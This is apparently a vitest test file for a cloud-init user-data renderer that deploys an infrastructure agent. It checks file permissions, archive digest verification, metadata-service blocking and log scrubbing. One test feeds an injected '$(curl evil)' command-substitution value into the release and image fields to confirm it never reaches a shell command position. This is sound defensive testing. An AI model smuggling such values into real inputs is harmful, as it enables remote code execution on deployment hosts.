import { describe, expect, it } from 'vitest';
import { SERVING_TIMEOUT_SECONDS } from '../../tasks/switch-machines';
import { bootPlanIn, cloudConfigFile } from '../../tests/helpers/pulumi-mock';
import { composeWaitTimeoutSeconds, type MachineUserDataParams, renderMachineUserData } from './machine-user-data';

const link = (object: string) => `https://cella-boot-diag.s3.fr-par.scw.cloud/${object}?X-Amz-Expires=900&X-Amz-Signature=${'f'.repeat(64)}`;

function params(overrides: Partial<MachineUserDataParams> = {}): MachineUserDataParams {
  return {
    slug: 'cella',
    role: 'backend',
    startServices: ['backend'],
    releaseSha: 'abc123def',
    envFileContent: 'APP_MODE=production\nBACKEND_TAG=abc123def\nBACKEND_URL=https://api.example.test',
    composeContent: 'services:\n  backend: {}',
    agentImage: {
      image: 'rg.fr-par.scw.cloud/ns/infra-agent:abc123def',
      url: link('releases/abc123def/images/infra-agent.tar'),
      sha256: 'b'.repeat(64),
    },
    links: {
      env: link('env/backend-abc123def.env'),
      bootAccount: link('boot-diag/backend-20261103T120000Z-boot.log'),
      archives: [{ name: 'backend', image: 'rg.fr-par.scw.cloud/ns/backend:abc123def', url: link('releases/x/backend.tar'), sha256: 'a'.repeat(64) }],
    },
    agentPorts: [{ service: 'backend', agentPort: 9000, port: 4000 }],
    drainSeconds: 10,
    ...overrides,
  };
}

const launcherOf = (out: string, slug = 'cella') => cloudConfigFile(out, `/etc/${slug}/run-agent.sh`) ?? '';

describe('renderMachineUserData', () => {
  it('writes the compose file, its env, the plan, the launcher and the units before it runs the first-boot script, each private file closed to other users', () => {
    const out = renderMachineUserData(params());
    expect(out.startsWith('#cloud-config\nwrite_files:\n')).toBe(true);
    expect(out.trimEnd().endsWith('runcmd:\n  - /etc/cella/first-boot.sh')).toBe(true);
    for (const [path, mode] of [
      ['/opt/app/compose.yml', '0600'],
      ['/opt/app/.env', '0600'],
      ['/etc/cella/boot-plan.json', '0600'],
      ['/etc/cella/agent.env', '0600'],
      ['/etc/cella/run-agent.sh', '0700'],
      ['/etc/cella/first-boot.sh', '0700'],
    ]) {
      expect(out).toContain(`  - path: ${path}\n    permissions: '${mode}'\n`);
    }
    expect(cloudConfigFile(out, '/etc/systemd/system/infra-agent.service')).toContain('EnvironmentFile=/etc/cella/agent.env');
    const { plan } = bootPlanIn(out, '/etc/cella/boot-plan.json');
    expect(plan.bootDiagnostics.logFile).toBe('/var/log/infra-boot.log');
    expect(plan.agent).toEqual({ ports: [{ service: 'backend', agentPort: 9000, port: 4000 }], drainSeconds: 10 });
  });

  it('keeps the serial console marker, namespaced under the app slug, and starts the agent at every boot', () => {
    const out = renderMachineUserData(params({ slug: 'acme' }));
    const firstBoot = cloudConfigFile(out, '/etc/acme/first-boot.sh') ?? '';
    expect(firstBoot).toContain('exec > >(tee -a /var/log/infra-boot.log 2>/dev/null > /dev/console) 2>&1');
    expect(firstBoot).toContain('say() { echo "::acme:: $*" ; }');
    expect(firstBoot).toContain('say "boot start"');
    expect(firstBoot).toContain('systemctl enable infra-agent.service');
    expect(cloudConfigFile(out, '/etc/systemd/system/infra-agent.service')).toContain('Restart=always');
    expect(launcherOf(out, 'acme')).toContain('--profile agent up --no-log-prefix --exit-code-from infra-agent infra-agent');
    expect(out).not.toContain('/etc/cella');
  });

  it('must not run an agent whose archive differs from its digest: the launcher checks it before Docker loads it', () => {
    const lines = launcherOf(renderMachineUserData(params())).split('\n');
    const check = lines.findIndex((line) => line.includes('sha256sum -c --status'));
    expect(check).toBeGreaterThan(-1);
    expect(lines[check]).toContain('"$AGENT_ARCHIVE_SHA256  /opt/app/images/agent.tar"');
    // A stalled transfer must not hold the boot: each attempt ends and is retried.
    expect(lines.find((line) => line.includes('"$AGENT_ARCHIVE_URL"'))).toMatch(/curl -fsS --max-time \d+ --retry/);
    expect(lines.slice(check + 1, check + 5)).toContain('    exit 1');
    expect(check).toBeLessThan(lines.findIndex((line) => line.includes('docker load')));
    expect(lines.findIndex((line) => line.includes('docker load'))).toBeLessThan(lines.findIndex((line) => line.startsWith('exec docker run')));
  });

  it('keeps every per-deploy value out of a shell command position: the EnvironmentFile and the JSON plan carry them', () => {
    const evil = '$(curl evil)';
    const out = renderMachineUserData(params({ releaseSha: evil, agentImage: { ...params().agentImage, image: `x:${evil}` } }));
    expect(launcherOf(out)).toContain('"$AGENT_IMAGE"');
    expect(launcherOf(out)).not.toContain(evil);
    expect(cloudConfigFile(out, '/etc/cella/first-boot.sh')).not.toContain(evil);
    expect(cloudConfigFile(out, '/etc/cella/agent.env')).toContain(`AGENT_IMAGE=x:${evil}`);
  });

  it("must not let an app container read the machine's user data: the launcher drops the metadata service for the bridge at every boot", () => {
    const lines = launcherOf(renderMachineUserData(params())).split('\n');
    const block = lines.findIndex((line) => line.startsWith('iptables -C DOCKER-USER -d 169.254.42.42 -j DROP'));
    // Only DOCKER-USER runs ahead of Docker's own ACCEPT rules: there is no other chain to fall back to, so a failure ends the boot. A
    // restart of the unit finds the rule there and adds none.
    expect(lines[block]).toBe(
      'iptables -C DOCKER-USER -d 169.254.42.42 -j DROP 2>/dev/null || iptables -I DOCKER-USER -d 169.254.42.42 -j DROP || exit 1',
    );
    expect(block).toBeLessThan(lines.findIndex((line) => line.startsWith('exec docker run')));
  });

  it("bounds the release companion and the start inside the deploy's wait for the machine to serve", () => {
    const { plan } = bootPlanIn(renderMachineUserData(params()), '/etc/cella/boot-plan.json');
    expect(plan.timeouts.composeWaitSeconds).toBe(composeWaitTimeoutSeconds);
    // The power-on, the env file and the archives take about the first three minutes; the failure and its upload must land before the wait ends.
    expect(composeWaitTimeoutSeconds + 180).toBeLessThanOrEqual(SERVING_TIMEOUT_SECONDS);
  });

  it('emits a log-scrub sed pattern that matches secret-bearing lines and links', () => {
    const firstBoot = cloudConfigFile(renderMachineUserData(params()), '/etc/cella/first-boot.sh') ?? '';
    const sedLines = firstBoot.split('\n').filter((line) => line.includes('sed') && line.includes('cloud-init'));
    expect(sedLines).toHaveLength(2);
    for (const line of sedLines) {
      const pattern = line.match(/'\/(.+)\/Id'/)?.[1];
      expect(pattern, `no sed address in: ${line}`).toBeTruthy();
      expect(line).toContain('-E');
      const re = new RegExp(pattern as string, 'i');
      expect(re.test('export SCW_SECRET_KEY=abc')).toBe(true);
      expect(re.test('DATABASE_URL=postgres://…')).toBe(true);
      expect(re.test(link('env/backend.env'))).toBe(true);
      expect(re.test('harmless log line')).toBe(false);
    }
  });
});
